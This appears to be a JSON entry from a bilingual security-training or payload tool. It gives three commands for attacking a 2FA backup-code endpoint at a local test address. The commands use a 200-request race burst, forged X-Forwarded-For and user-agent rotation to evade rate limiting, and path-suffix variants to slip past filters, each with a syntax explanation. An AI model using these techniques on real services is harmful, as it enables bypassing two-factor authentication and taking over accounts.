    {
      "id": "auth-2fa-recovery-code",
      "patches": [
        {
          "area": "wafBypass",
          "index": 0,
          "expectedCommand": "python3 - <<'PY'\nimport asyncio, aiohttp\nTARGET=\"http://127.0.0.1:8080/test/verify-backup-code\"\nasync def main():\n    async with aiohttp.ClientSession() as s:\n        rs = await asyncio.gather(*[s.post(TARGET, json={\"code\":\"PAYLOADER_BACKUP_CODE\"}) for _ in range(200)])\n        print(sum(r.status == 200 for r in rs))\nasyncio.run(main())\nPY",
          "syntaxBreakdown": [
            {
              "part": "python3 - <<'PY'",
              "explanation": {
                "zh": "heredoc 执行脚本",
                "en": "Runs an inline Python heredoc"
              },
              "type": "control"
            },
            {
              "part": "aiohttp.ClientSession()",
              "explanation": {
                "zh": "异步 HTTP 会话",
                "en": "Async HTTP session"
              },
              "type": "function"
            },
            {
              "part": "asyncio.gather(",
              "explanation": {
                "zh": "并发收集请求",
                "en": "Gathers concurrent requests"
              },
              "type": "function"
            },
            {
              "part": "sum(r.status == 200 for r in rs)",
              "explanation": {
                "zh": "统计成功数",
                "en": "Counts successes"
              },
              "type": "function"
            }
          ]
        },
        {
          "area": "wafBypass",
          "index": 1,
          "expectedCommand": "python3 - <<'PY'\nimport concurrent.futures, itertools, requests\nTARGET=\"http://127.0.0.1:8080/test/verify-backup-code\"\nuas=itertools.cycle([\"Mozilla/5.0\",\"curl/8.0\",\"python-requests\"])\ndef hit(i):\n    return requests.post(TARGET, json={\"code\":\"PAYLOADER_BACKUP_CODE\"}, headers={\"User-Agent\":next(uas),\"X-Forwarded-For\":f\"10.0.{i//250}.{i%250}\"}).status_code\nwith concurrent.futures.ThreadPoolExecutor(50) as ex:\n    codes=list(ex.map(hit, range(200)))\nprint(codes.count(200))\nPY",
          "syntaxBreakdown": [
            {
              "part": "itertools.cycle([\"Mozilla/5.0\",\"curl/8.0\",\"python-requests\"])",
              "explanation": {
                "zh": "轮换 UA",
                "en": "Rotates user agents"
              },
              "type": "function"
            },
            {
              "part": "\"X-Forwarded-For\":f\"10.0.{i//250}.{i%250}\"",
              "explanation": {
                "zh": "轮换伪造 XFF",
                "en": "Rotates forged XFF"
              },
              "type": "payload"
            },
            {
              "part": "ThreadPoolExecutor(50)",
              "explanation": {
                "zh": "五十线程并发",
                "en": "50 worker threads"
              },
              "type": "function"
            }
          ]
        },
        {
          "area": "wafBypass",
          "index": 2,
          "expectedCommand": "for suffix in \"/\" \".json\" \"/v2\"; do curl -sS --max-time 5 -o /dev/null -w \"%{http_code} $suffix\\n\" -d \"code=PAYLOADER_BACKUP_CODE\" \"http://127.0.0.1:8080/test/verify-backup-code${suffix}\"; done",
          "syntaxBreakdown": [
            {
              "part": "for suffix in \"/\" \".json\" \"/v2\"",
              "explanation": {
                "zh": "遍历路径后缀",
                "en": "Iterates path suffixes"
              },
              "type": "control"
            },
            {
              "part": "\"http://127.0.0.1:8080/test/verify-backup-code${suffix}\"",
              "explanation": {
                "zh": "后缀变形端点",
                "en": "Endpoint with suffix"
              },
              "type": "url"
            },
            {
              "part": "-d \"code=PAYLOADER_BACKUP_CODE\"",
              "explanation": {
                "zh": "恢复码参数",
                "en": "Backup code param"
              },
              "type": "payload"
            }
          ]
        }
      ]
    },
